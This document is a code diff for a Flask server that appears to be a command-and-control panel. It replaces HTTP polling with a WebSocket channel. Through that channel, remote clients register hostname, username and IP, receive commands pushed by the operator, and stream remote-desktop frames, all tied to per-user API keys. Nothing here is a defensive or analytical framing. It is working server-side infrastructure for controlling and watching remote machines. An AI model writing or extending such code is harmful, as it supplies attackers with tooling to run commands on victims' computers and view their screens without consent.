@@ -1,4 +1,5 @@
 import os
+import json
 import secrets
 import sqlite3
 import time
@@ -11,15 +12,18 @@ import threading
 from flask import Flask, request, jsonify, send_from_directory, send_file, session, Response
 from werkzeug.security import generate_password_hash, check_password_hash
 from werkzeug.utils import secure_filename
+from flask_sock import Sock
 
 app = Flask(__name__, static_folder='public')
+sock = Sock(app)
 
 # In-memory frame storage for Remote Desktop
 rdp_frames = {}
 rdp_frames_lock = threading.Lock()
 
-active_clients = {}
-active_clients_lock = threading.Lock()
+# WebSocket connected clients: client_id -> {ws, hostname, username, ip, user_id}
+ws_clients = {}
+ws_clients_lock = threading.Lock()
 
 # Paths setup
 BASE_DIR = os.path.abspath(os.path.dirname(__file__))
@@ -795,65 +799,87 @@ def admin_delete_invite(code):
     return jsonify({'success': True})
 
 
-# ===== C2 ENDPOINTS =====
+# ===== C2 WEBSOCKET =====
 
-@app.route('/api/c2/command', methods=['GET'])
-def c2_get_command():
-    key = request.headers.get('x-panel-key', '')
-    if not key:
-        return jsonify({'error': 'unauthorized'}), 401
-    with get_db() as db:
-        user = db.execute('SELECT id FROM users WHERE api_key = ?', (key,)).fetchone()
-        if not user:
-            return jsonify({'error': 'unauthorized'}), 401
-    owner_id = user['id']
+@sock.route('/api/c2/ws')
+def c2_websocket(ws):
+    client_id = None
+    try:
+        raw = ws.receive(timeout=10)
+        if not raw:
+            return
+        auth = json.loads(raw)
+        if auth.get('type') != 'auth':
+            return
 
-    client_id = request.args.get('client_id', '')
-    hostname = request.args.get('hostname', '')
-    username = request.args.get('username', '')
-    if not client_id:
-        return jsonify({'command': ''})
+        key = auth.get('key', '')
+        client_id = auth.get('client_id', '')
+        hostname = auth.get('hostname', '')
+        username = auth.get('username', '')
+        if not key or not client_id:
+            return
 
-    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
+        with get_db() as db:
+            user = db.execute('SELECT id FROM users WHERE api_key = ?', (key,)).fetchone()
+            if not user:
+                return
+        owner_id = user['id']
 
-    with active_clients_lock:
-        active_clients[client_id] = time.time()
+        ip = request.headers.get('X-Forwarded-For', request.remote_addr)
 
-    with get_db() as db:
-        db.execute('''
-            INSERT INTO clients (client_id, user_id, hostname, username, ip, last_heartbeat)
-            VALUES (?, ?, ?, ?, ?, CURRENT_TIMESTAMP)
-            ON CONFLICT(client_id) DO UPDATE SET
-                hostname = CASE WHEN excluded.hostname != '' THEN excluded.hostname ELSE clients.hostname END,
-                username = CASE WHEN excluded.username != '' THEN excluded.username ELSE clients.username END,
-                ip = excluded.ip,
-                last_heartbeat = CURRENT_TIMESTAMP
-        ''', (client_id, owner_id, hostname, username, ip))
-        db.commit()
-
-        row = db.execute('SELECT pending_command FROM clients WHERE client_id = ?', (client_id,)).fetchone()
-        if row and row['pending_command']:
-            cmd = row['pending_command']
-            db.execute('UPDATE clients SET pending_command = NULL WHERE client_id = ?', (client_id,))
+        with get_db() as db:
+            db.execute('''
+                INSERT INTO clients (client_id, user_id, hostname, username, ip, last_heartbeat)
+                VALUES (?, ?, ?, ?, ?, CURRENT_TIMESTAMP)
+                ON CONFLICT(client_id) DO UPDATE SET
+                    hostname = excluded.hostname, username = excluded.username,
+                    ip = excluded.ip, last_heartbeat = CURRENT_TIMESTAMP
+            ''', (client_id, owner_id, hostname, username, ip))
             db.commit()
-            return jsonify({'command': cmd})
-    return jsonify({'command': ''})
+
+        with ws_clients_lock:
+            ws_clients[client_id] = {
+                'ws': ws, 'hostname': hostname, 'username': username,
+                'ip': ip, 'user_id': owner_id
+            }
+
+        ws.send(json.dumps({'type': 'auth_ok'}))
+
+        while True:
+            data = ws.receive(timeout=30)
+            if data is None:
+                ws.send('{"type":"ping"}')
+                continue
+            if isinstance(data, bytes):
+                with rdp_frames_lock:
+                    rdp_frames[client_id] = {'data': data, 'ts': time.time()}
+                continue
+            msg = json.loads(data)
+            if msg.get('type') == 'pong':
+                continue
+            with get_db() as db:
+                db.execute('UPDATE clients SET last_heartbeat = CURRENT_TIMESTAMP WHERE client_id = ?', (client_id,))
+                db.commit()
+    except Exception:
+        pass
+    finally:
+        if client_id:
+            with ws_clients_lock:
+                ws_clients.pop(client_id, None)
 
 
 @app.route('/api/c2/clients', methods=['GET'])
 @login_required
 def c2_list_clients():
     user = request.current_user
-    now = time.time()
     with get_db() as db:
         rows = db.execute('''
             SELECT client_id, hostname, username, ip, last_heartbeat, pending_command
             FROM clients WHERE user_id = ? ORDER BY last_heartbeat DESC
         ''', (user['id'],)).fetchall()
     clients = []
-    with active_clients_lock:
+    with ws_clients_lock:
         for r in rows:
-            last_seen = active_clients.get(r['client_id'], 0)
             clients.append({
                 'client_id': r['client_id'],
                 'hostname': r['hostname'],
@@ -861,7 +887,7 @@ def c2_list_clients():
                 'ip': r['ip'],
                 'last_heartbeat': r['last_heartbeat'],
                 'pending_command': r['pending_command'],
-                'is_online': (now - last_seen) < 15
+                'is_online': r['client_id'] in ws_clients
             })
     return jsonify(clients)
 
@@ -880,34 +906,20 @@ def c2_send_command():
         client = db.execute('SELECT client_id FROM clients WHERE client_id = ? AND user_id = ?', (client_id, user['id'])).fetchone()
         if not client:
             return jsonify({'error': 'client not found'}), 404
-        db.execute('UPDATE clients SET pending_command = ? WHERE client_id = ? AND user_id = ?', (command, client_id, user['id']))
-        db.commit()
-    return jsonify({'success': True})
+
+    with ws_clients_lock:
+        wsc = ws_clients.get(client_id)
+    if not wsc:
+        return jsonify({'error': 'client offline'}), 404
+
+    try:
+        wsc['ws'].send(json.dumps({'type': 'command', 'command': command}))
+        return jsonify({'success': True})
+    except Exception:
+        return jsonify({'error': 'send failed'}), 500
 
 
-# ===== REMOTE DESKTOP FRAME ENDPOINTS =====
-
-@app.route('/api/c2/frame/<client_id>', methods=['POST'])
-def c2_upload_frame(client_id):
-    key = request.headers.get('x-panel-key', '')
-    if not key:
-        return jsonify({'error': 'unauthorized'}), 401
-    with get_db() as db:
-        user = db.execute('SELECT id FROM users WHERE api_key = ?', (key,)).fetchone()
-        if not user:
-            return jsonify({'error': 'unauthorized'}), 401
-
-    frame_data = request.get_data()
-    if not frame_data:
-        return jsonify({'error': 'empty frame'}), 400
-
-    with rdp_frames_lock:
-        rdp_frames[client_id] = {
-            'data': frame_data,
-            'ts': time.time()
-        }
-    return jsonify({'status': 'ok'})
-
+# ===== REMOTE DESKTOP SSE STREAM =====
 
 @app.route('/api/c2/stream/<client_id>')
 @login_required
